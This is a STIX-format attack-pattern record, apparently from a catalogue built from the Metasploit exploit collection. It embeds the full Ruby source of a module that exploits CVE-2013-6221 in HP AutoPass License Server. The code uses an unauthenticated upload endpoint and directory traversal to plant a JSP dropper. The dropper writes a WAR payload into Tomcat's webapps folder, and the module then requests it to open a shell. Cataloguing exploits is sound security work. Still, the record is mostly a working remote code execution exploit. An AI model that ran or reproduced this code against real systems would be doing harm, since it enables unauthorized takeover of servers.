{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6defd32a-6b93-4cb5-8bf2-24fe8677a86c",
    "created": "2024-08-14T16:55:45.261211Z",
    "modified": "2024-08-14T16:55:45.261215Z",
    "name": "HP AutoPass License Server File Upload",
    "description": " This module exploits a code execution flaw in HP AutoPass License Server. It abuses two weaknesses in order to get its objective. First, the AutoPass application doesn't enforce authentication in the CommunicationServlet component. Second, it's possible to abuse a directory traversal when uploading files thorough the same component, allowing to upload an arbitrary payload embedded in a JSP. The module has been tested successfully on HP AutoPass License Server 8.01 as installed with HP Service Virtualization 3.50. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_autopass_license_traversal.rb",
            "external_id": "hp_autopass_license_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6221"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c04333125"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HP AutoPass License Server File Upload',\n      'Description' => %q{\n        This module exploits a code execution flaw in HP AutoPass License Server. It abuses two\n        weaknesses in order to get its objective. First, the AutoPass application doesn't enforce\n        authentication in the CommunicationServlet component. Second, it's possible to abuse a\n        directory traversal when uploading files thorough the same component, allowing to upload\n        an arbitrary payload embedded in a JSP. The module has been tested successfully on\n        HP AutoPass License Server 8.01 as installed with HP Service Virtualization 3.50.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2013-6221'],\n          ['ZDI', '14-195'],\n          ['BID', '67989'],\n          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c04333125']\n        ],\n      'Privileged'  => true,\n      'Platform'    => %w{ java },\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          ['Windows 2003 SP2 / HP AutoPass License Server 8.01 / HP Service Virtualization 3.50',\n            {\n              'InstallDepth' => 4,\n              'InstallFolder' => '/HP AutoPass License Server/HP AutoPass License Server',\n              'WebappsDepth' => 1\n            }\n          ],\n          ['Windows 2008 32 bits/ HP AutoPass License Server 8.01 / HP Service Virtualization 3.50',\n            {\n              'InstallDepth' => 7,\n              'InstallFolder' => '/Program Files/HP/HP AutoPass License Server/HP AutoPass License Server/HP AutoPass License Server',\n              'WebappsDepth' => 1\n            }\n          ],\n          ['Windows 2008 64 bits/ HP AutoPass License Server 8.01 / HP Service Virtualization 3.50',\n           {\n               'InstallDepth' => 7,\n               'InstallFolder' => '/Program Files (x86)/HP/HP AutoPass License Server/HP AutoPass License Server/HP AutoPass License Server',\n               'WebappsDepth' => 1\n           }\n          ],\n          ['Windows 2012 / HP AutoPass License Server 8.01 / HP Service Virtualization 3.50',\n            {\n              'InstallDepth' => 4,\n              'InstallFolder' => '/HP AutoPass License Server/HP AutoPass License Server',\n              'WebappsDepth' => 1\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-01-10'))\n\n    register_options(\n      [\n        Opt::RPORT(5814),\n        OptString.new('TARGETURI', [true, 'Path to HP AutoPass License Server Application', '/autopass'])\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('INSTALL_DEPTH', [false, 'Traversal Depth to reach the HP AutoPass License Server folder']),\n        OptString.new('INSTALL_FOLDER', [false, 'HP AutoPass License Server folder']),\n        OptInt.new('WEBAPPS_DEPTH', [false, 'Traversal Depth to reach the Tomcat webapps folder'])\n      ])\n  end\n\n\n  def check\n    check_code = Exploit::CheckCode::Safe\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path.to_s, \"cs\",\"pdfupload\"),\n        'method' => 'POST'\n      })\n\n    unless res\n      check_code = Exploit::CheckCode::Unknown\n    end\n\n    if res && res.code == 500 &&\n       res.body.to_s.include?(\"HP AutoPass License Server\") &&\n       res.body.to_s.include?(\"java.lang.NullPointerException\") &&\n       res.body.to_s.include?(\"com.hp.autopass\")\n\n      check_code = Exploit::CheckCode::Detected\n    end\n\n    check_code\n  end\n\n  def exploit\n    app_base = rand_text_alphanumeric(4+rand(32-4))\n    war = payload.encoded_war({ :app_name => app_base }).to_s\n    war_filename = \"#{app_base}.war\"\n\n    # By default, the working directory when executing the JSP is:\n    # C:\\Program Files\\HP\\HP AutoPass License Server\\HP AutoPass License Server\\HP AutoPass License Server\\bin\n    # The war should be dropped to the next location to autodeploy:\n    # C:\\Program Files\\HP\\HP AutoPass License Server\\HP AutoPass License Server\\HP AutoPass License Server\\webapps\n    war_traversal = webapps_traversal\n    war_traversal << \"webapps/#{war_filename}\"\n    dropper = jsp_drop_bin(war, war_traversal)\n    dropper_filename = rand_text_alpha(8) + \".jsp\"\n\n    print_status(\"Uploading the JSP dropper #{dropper_filename}...\")\n    # The JSP, by default, is uploaded to:\n    # C:\\Program Files\\HP\\HP AutoPass License Server\\AutoPass\\LicenseServer\\conf\\pdfiles\\\n    # In order to execute it, through the AutoPass application we would like to drop it here:\n    # C:\\Program Files\\HP\\HP AutoPass License Server\\HP AutoPass License Server\\HP AutoPass License Server\\webapps\\autopass\\scripts\n    dropper_traversal = install_traversal\n    dropper_traversal << \"#{install_folder}/webapps/autopass/scripts/#{dropper_filename}\"\n\n    res = upload_file(dropper_traversal, dropper)\n\n    register_files_for_cleanup(\"#{webapps_traversal}webapps/autopass/scripts/#{dropper_filename}\")\n    register_files_for_cleanup(\"#{webapps_traversal}webapps/#{war_filename}\")\n\n    unless res && res.code == 500 &&\n           res.body.to_s.include?(\"HP AutoPass License Server\") &&\n           res.body.to_s.include?(\"java.lang.NullPointerException\") &&\n           res.body.to_s.include?(\"com.hp.autopass\")\n\n      print_error(\"Unexpected response... upload maybe failed, trying anyway...\")\n    end\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path, \"scripts\", dropper_filename),\n      'method' => 'GET'\n    })\n\n    unless res and res.code == 200\n      print_error(\"Unexpected response after executing the dropper...\")\n    end\n\n    10.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi(\n        {\n          'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8) + \".jsp\"),\n          'method' => 'GET'\n        })\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      break if res.code == 200\n    end\n  end\n\n  def webapps_traversal\n    if datastore['WEBAPPS_DEPTH'] > 0\n      depth = datastore['WEBAPPS_DEPTH']\n    elsif target['WebappsDepth']\n      depth = target['WebappsDepth']\n    else\n      depth = 1\n    end\n\n    \"../\" * depth\n  end\n\n  def install_traversal\n    if datastore['INSTALL_DEPTH'] > 0\n      depth = datastore['INSTALL_DEPTH']\n    elsif target['InstallDepth']\n      depth = target['InstallDepth']\n    else\n      depth = 4\n    end\n\n    \"/..\" * depth\n  end\n\n  def install_folder\n    if !datastore['INSTALL_FOLDER'].blank?\n      folder = datastore['INSTALL_FOLDER']\n    elsif target['InstallFolder']\n      folder = target['InstallFolder']\n    else\n      folder = \"/HP AutoPass License Server/HP AutoPass License Server\"\n    end\n\n    folder\n  end\n\n  # Using a JSP dropper because the vulnerability doesn't allow to upload\n  # 'binary' files, so a WAR can't be uploaded directly.\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def upload_file(file_name, contents)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(contents, \"application/octet-stream\", nil, \"form-data; name=\\\"uploadedFile\\\"; filename=\\\"#{file_name}\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path.to_s, \"cs\",\"pdfupload\"),\n        'method' => 'POST',\n        'data'   => data,\n        'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\"\n      })\n\n    res\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-10",
    "x_mitre_platforms": [
        "%w{ java }"
    ]
}